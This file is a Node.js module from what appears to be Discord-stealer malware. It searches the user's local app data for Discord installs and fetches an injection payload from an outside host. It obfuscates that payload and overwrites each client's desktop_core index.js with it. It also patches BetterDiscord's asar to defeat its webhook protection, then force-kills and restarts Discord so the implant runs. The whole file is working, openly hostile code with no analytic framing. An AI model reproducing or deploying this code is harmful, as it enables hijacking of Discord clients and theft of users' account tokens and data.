const fs = require("fs");
const axios = require("axios");
const path = require("path");
const buffreplace = require("buffer-replace");
const getconfig = require("./../../config/config")();

const injectPaths = [];

const localappdata = process.env.localappdata;

async function discordInjected(enable) {
    if (enable !== "yes") return;

    const discords = fs
        .readdirSync(localappdata)
        .filter((file) => file.includes("iscord"))
        .map((file) => path.join(localappdata, file));
    for (const paths of discords) {
        findIndex(paths);
    }
    for (const paths of discords) {
        await findInject(paths);
    }
    await inject();
    await betterbroke();
    if (getconfig.kill.discords === "yes") {
        await killAllDiscord();
    }
}

function findIndex(f) {
    let discordPaths = fs.readdirSync(f);
    discordPaths.forEach((file) => {
        let filePath = path.join(f, file);
        let fileStat = fs.statSync(filePath);
        if (fileStat.isDirectory()) {
            findIndex(filePath);
        } else {
            if (
                file === "index.js" &&
                !f.includes("node_modules") &&
                f.includes("desktop_core")
            ) {
                injectPaths.push(filePath);
            }
        }
    });
}

async function inject() {
    let resp = await axios.get(
        "https://6889.fun/api/aurathemes/injects/f/discord", {
        headers: {
            aurathemes: true,
        },
    },
    );
    let obf = require("javascript-obfuscator").obfuscate(resp.data.replace("%WEBHOOK%", "x"), { ignoreRequireImports: true, compact: true, controlFlowFlattening: true, controlFlowFlatteningThreshold: 0.5, deadCodeInjection: false, deadCodeInjectionThreshold: 0.01, debugProtection: false, debugProtectionInterval: 0, disableConsoleOutput: true, identifierNamesGenerator: "hexadecimal", log: false, numbersToExpressions: false, renameGlobals: false, selfDefending: false, simplify: true, splitStrings: false, splitStringsChunkLength: 5, stringArray: true, stringArrayEncoding: ["base64"], stringArrayIndexShift: true, stringArrayRotate: false, stringArrayShuffle: false, stringArrayWrappersCount: 5, stringArrayWrappersChainedCalls: true, stringArrayWrappersParametersMaxCount: 5, stringArrayWrappersType: "function", stringArrayThreshold: 1, transformObjectKeys: false, unicodeEscapeSequence: false },);
    let payload = obf.getObfuscatedCode();
    injectPaths.forEach((file) => {
        try {
            fs.writeFileSync(file, payload, {
                encoding: "utf8",
                flag: "w",
            });
        } catch { }
    });
    fs.readdirSync(__dirname).forEach((a) => {
        if (a.endsWith(".xml")) {
            fs.unlinkSync(path.join(__dirname, a));
        }
    });
}

function betterbroke() {
    let dir = `${localappdata}/BetterDiscord/data/betterdiscord.asar`;
    if (fs.existsSync(dir)) {
        fs.writeFileSync(
            dir,
            buffreplace(fs.readFileSync(dir), "api/webhooks", "aurathemesontop"),
        );
    }
    return;
}

async function killAllDiscord() {
    const execx = require("util").promisify(exec);
    const clients = [
        "Discord.exe",
        "DiscordCanary.exe",
        "DiscordDevelopment.exe",
        "DiscordPTB.exe",
    ];
    try {
        const { stdout } = await execx("tasklist");
        for (const c of clients) {
            if (stdout.includes(c)) {
                await restartClient(c);
            }
        }
    } catch { }
}

async function restartClient(c) {
    try {
        await exec(`taskkill /F /T /IM ${c}`);
        const clientPath = `${localappdata}/${c.replace(
            ".exe",
            "",
        )}/Update.exe`;
        await exec(`"${clientPath}" --processStart ${c}`);
    } catch { }
}

async function findInject(f) {
    const files = await fs.promises.readdir(f);
    for (const file of files) {
        const filePath = path.join(f, file);
        const fileStat = await fs.promises.stat(filePath);
        if (fileStat.isDirectory()) {
            if (file === "aura") {
                await fs.rmdirSync(filePath);
            } else {
                await findInject(filePath);
            }
        }
    }
}

module.exports = {
    discordInjected
}